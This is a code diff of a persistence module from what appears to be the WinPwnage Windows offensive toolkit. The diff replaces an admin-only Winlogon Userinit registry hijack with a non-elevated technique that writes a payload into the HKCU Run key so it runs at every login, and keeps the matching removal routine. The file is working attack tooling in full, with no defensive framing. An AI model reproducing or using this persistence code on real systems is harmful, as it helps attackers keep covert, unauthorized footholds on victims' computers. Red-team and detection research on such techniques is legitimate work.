+++ winpwnage/functions/persist/persistMethod5.py
@@ -1,30 +1,23 @@
-import os
 from winpwnage.core.prints import *
 from winpwnage.core.utils import *
 
 persistMethod5_info = {
-	"Description": "Persistence using userinit key",
-	"Method": "Registry key (UserInit) manipulation",
+	"Description": "Persistence using HKCU run key",
+	"Method": "Registry key (HKCU Run) manipulation",
 	"Id": "5",
 	"Type": "Persistence",
-	"Fixed In": "99999" if information().admin() == True else "0",
+	"Fixed In": "99999",
 	"Works From": "7600",
-	"Admin": True,
+	"Admin": False,
 	"Function Name": "persistMethod5",
 	"Function Payload": True,
 }
 
 def persistMethod5(payload, name="", add=True):
-	if not information().admin():
-		print_error("Cannot proceed, we are not elevated")
-		return False
-
-	winlogon = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
 	if add:
 		if payloads().exe(payload):
-			p = os.path.join(information().system_directory(), "userinit.exe," + payloads().exe(payload)[1])
-			if registry().modify_key(hkey="hklm", path=winlogon, name="Userinit", value=p):
-				print_success("Successfully created Userinit key containing payload ({})".format(payloads().exe(payload)[1]))
+			if registry().modify_key(hkey="hkcu", path="Software\\Microsoft\\Windows\\CurrentVersion\\Run", name=name, value=payloads().exe(payload)[1]):
+				print_success("Successfully created {name} key containing payload ({payload})".format(name=name, payload=payloads().exe(payload)[1]))
 				print_success("Successfully installed persistence, payload will run at login")
 			else:
 				print_error("Unable to install persistence")
@@ -33,7 +26,7 @@ def persistMethod5(payload, name="", add=True):
 			print_error("Cannot proceed, invalid payload")
 			return False
 	else:
-		if registry().remove_key(hkey="hklm", path=winlogon, name="Userinit"):
+		if registry().remove_key(hkey="hkcu", path="Software\\Microsoft\\Windows\\CurrentVersion\\Run", name=name):
 			print_success("Successfully removed persistence")
 		else:
 			print_error("Unable to remove persistence")
